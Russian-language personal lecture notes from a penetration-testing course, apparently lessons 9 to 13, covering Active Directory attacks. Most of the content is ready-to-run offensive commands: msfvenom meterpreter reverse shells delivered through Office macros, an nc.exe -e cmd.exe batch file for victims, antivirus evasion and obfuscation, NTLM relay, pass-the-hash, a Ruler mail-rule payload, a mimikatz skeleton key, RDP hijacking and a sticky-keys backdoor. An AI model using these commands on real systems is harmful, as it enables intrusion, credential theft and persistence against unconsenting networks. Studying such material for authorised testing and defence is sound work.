wc -l <file>		Подсчитать кол-во строк в файле





Занятие 9

hashdump - вытаскивает все локальные учетки



Get-NetLoggedon - пользователи, залогиненные на компьютере

Find-LocalAdminAccess -Verbose - список машин и доступ к ним

Invoke-UserHunter



Bloodhound (Linux Domain enumeration)
https://github.com/BloodHoundAD/BloodHound

Default - local admins, group members, domain trusts, sessions
Group - group membership
LocalGroup - local admins
GPOLocalGroup - 
ComputerOnly - local admin, session
Sessions - user sessioin
LoggedOn - 

Collectors для bloodhound необходимо скачивать заново (часто обновляются)



ADiDNSDump
https://github.com/dirkjanm/adidnsdump
$ adidnsdump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65



Ldapdomaindump		Собирает информацию о домене и представляет ее в красивом виде
https://github.com/dirkjanm/ldapdomaindump
$ python3 setup.py install
$ ldapdomaindump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65


post/widows/gather/credetials/gpp

Михаил Нащекин (Mikhail Naschekin) - работает в positive technologies





Занятие 10

Antivirus Bypass



Payload через макросы
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f vba
Документ -> Macro -> create
msf6> use exploit/multi/handler


Просмотр рабочего стола по vnc
msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -o malware.exe



Список енкодеров для нагрузки
$ msfvenom --list encoders		Список енкодеров
$ msfvenom -i				Кол-во иттераций енкодера

-e x86/alpha


Закодированный vnc шелл (не сильно помогает)
msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -e x86/shikata_ga_nai -o encmalware.exe



##### НЕ БЫТЬ ВИРУСОМ #####
В Kali есть легитимные виндовые бинарники
/usr/share/windows-resources/binaries


Беспалевный reverse shell

Поднимаем шару
$ sudo impacket/examples/smbserver.py <smbname> . -smbsupport

Ловим подключение
$ nc -nvlp <port>

Записываем в батник и отдаем жертве на запуск
%COMSPEC% /b /c start /b /min \\<share ip>\<smbname>\nc.exe <nc ip> <nc port> -e cmd.exe


$ impacket/examples/wmiexec.py -h .Admin:Pa$$w0rd@<target ip> 


Утилита для скрытного подключения
https://github.com/besimorhino/powercat


PS c:\> powercat -с <ip>


Powershell обфускация (новые появляются постоянно, проще загуглить)
Если использовать несколько разных обфускаторов, то надежность больше
https://github.com/danielbohannon/Invoke-Obfuscation
https://github.com/CBHue/PyFuscation
https://github.com/
https://github.com/



##### БЫТЬ НЕОЖИДАННЫМ #####

Используем редкие языки

<скрипт из презентации на GO>



Veil 
https://github.com/Veil-Framework/Veil-Evasion
cd Veil-Evasion
cd setup
setup.sh -c

OR 
docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil


find . -name *.bat





Занятие 11)

Линукс может быть интегрирован в домен (линукс знает, как работать с доменом, но домен не умеет работать с линуксом)
/etc/krb5



NTLM Relay

Обращение по: 
NTLM - ip адреса
Kerberos - имена



Атака
$ crackmpexec smb 192.168.1.0/24				Ищем цели с signing:False
В среднем можно подключиться к 5 серверам с одной машины
$ сrackmapexec smb <ip>/<mask> --gen-relay-list targets.txt	Создаем список из клиента и пачки серверов, на которых хотим авторизоваться
/etc/Responder/Responder.conf
	
	
$ responder -I eth0 -r -d -w					
$ ntlmrelayx.py -tf targets.txt -c "COMMAND"


NET NTLM:
1) NTLM negotiate
	указание клиентом своих возможностей
2) 



Будучи никем получаем доменную учетку
sudo ntlmrelayx.py -t ldaps://<ip> --no-dump --no-da --n-acl --no-validate-privs --add-computer <pentest> -h

crackmapexec smb 192.168.1.85 -u SQLSRV\$ -H 0d93f4fb9cbb58907137d6af7ff37b91





Занятие 12

хинт мб 70 машина с анонимным ftp
с доменной учеткой можно делать керберостинг, асрепростинг, ремов мик,

Сканируем максимально широко!



Достижение цели

Ищем машины с двумя интерфейсами
$ crackmapexec smb <ip>/24 -u Administrator -H <hash> -x "ipconfig"
$ crackmapexec smb <ip>/24 -u Administrator -H <hash> -x "netstat "



Обход сегментации сети

Gost
https://github.com/ginuerzh/gost
https://docs.ginuerzh.xyz/gost/en/	Wiki

На 192.168.1.1
gost.exe -L socks5://:8081
На kali
./gost -L socks5://:8080 -F socks5://192.168.1.1:8081

msf6> set proxies

Более длинная цепочка
gost -L=socks5://:8080 -F=socks5://192.168.1.1:8081 -F=socks5://192.168.1.2:8082 -F=socks5://192.168.1.3:8083 



Реальный сценарий (reverse proxy, что бы обойти нат и фаерволл)
На сервере с белым IP (195.230.102.1)
$ gost -L socks5://0.0.0.0:1337

На таргет сервере
$ ./gost -L socks5://127.0.0.1:13338 &
$ ./gost -L rtcp://0.0.0.0:13381/127.0.0.1:13338 -F socks5://<195.230.102.1>:1337 &
В proxychains
socks5 127.0.0.1 13381

Port forwarding
gost -L=tcp://:2222/192.168.1.1:22



Proxychains
https://github.com/haad/proxychains

$ proxychains <msfconsole> 2>/dev/null



Tsocks (Не очень стабильный, но при сканировании работает в сотни раз быстрее чем proxychains)
/etc/tsocks.conf
$ export LD_PRELOAD=libtsocks.so; nmap 192.168.1.1 -sT 	Опция sT нужна что бы работать через прокси



Доп материалы по пивотингу
https://book.hacktricks.xyz/tunneling-and-port-forwarding
https://www.radarhack.com/tutorial/DEFEATING_THE_NETWORK_SECURITY_INFRASTRUCTURE.pdf

Port forward over SOCKS4:
127.0.0.1:3389 -> 192.168.1.100:3389 over socks 127.0.0.1:9999

socat TCP4-LISTEN:3389, fork
SOCKS4:127.0.0.1:192.168.1.100:3389, socksport=9999

socks proxy over ssh
$ ssh -D 31337 user@192.168.1.1



SCCM 

ZABBIX
Система мониторинга 
можно исполнять код на машинах (любые архитектуры)
https://youtube.com/v=Vw_Av



RULER
https://github.com/sensepost/ruler
youtube.com/watch?v=C07GS4M8BZk


mail.ruler.local
./ruler -k --verbose --email i.ivanov@ruler.local --username i.ivanov --hash 7395bbfcb39adb3ca48c54663201266f add --location '\\198.18.245.13\kek\meter.exe' --trigger "kekpek4" --name maliciousrule4 --send --subject kekpek4
msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.18.245.13 LPORT=4567 -f exe -o meter.exe
sudo smbserver.py kek . -smb2support




Проверяем доменные учетки
$ crackmapexec smb <any domain machine> -u <uname> -H <hash>
$ crackmapexec smb <any domain machine>/24 -u <uname> -H <hash>



Атаки на GPO
auxiliary/scanner/smb/smb_enum_gpp
нужно скормить любую доменную учетку

post/windows/gather/credentials/gpp

Через модули cme
$ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_autologon
$ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_password





Занятие 13

Redteaming не может быть без Blueteam

Purple Team - следит за ходом и дает подсказуи отстающей команде

Задача Red Team - не спалиться синим

Если понимаешь "Ага, тут я мог спалится", то лучше отвлечь внимаение ложным следом

Сценарий:
звоним в техподдержку, представляемся 

Интерфейс кали можно сделать пожожим на линукс 
$ kali-undercover



Сканировать nmap и masscan плохо (легко детектится)
В крайнем случае сканим один-два порта и максимально тихо

Вместо этого используем LDAP 

Запросы к неживым машинам палятся

Обычно IDS IPS стоят только на доменных машинах, при этом недоменные машины чаще не защищены

Компрометация админ панели VMWare позволяет получить доступ к trunk порту и после скакать по vlan-ам

C:\> takeown /f <file>

Persistent sticky keys
админ консоль при залипании клавиш
msf6> search sticky_keys


Угон RDP сессии
C:\> quser		Просмореть список акивных RDP сессий
C:\> query user		Или так
C:\> tscon <id>		Угоняем активную сессию



Pentecter Academy
GCB 
Очень хороший и сложный стенд по доменам



Skeleton Key 
Добавляем второй пароль, не нарушая работу старого. Нужно сделать на всех контроллерах домена, сбрасывается при перезагрузке
# mimikatz.exe
# privilege::debug
# misc::skeleton
C:\> net use x: \\dc-01\admin$ /user:jeff mimikatz	Входим по керберосу на учетку с паролем mimikatz, при этом старые парлоли будут работать



Набор материала по Persistence 
https://github.com/infosecn1nja/AD-Attack-Defence/blob/master/README.md#persistence


лука сафонов 2 лекции по АД
Книга Windows Internals обязательно прочитать!
22:03 23.04.2021
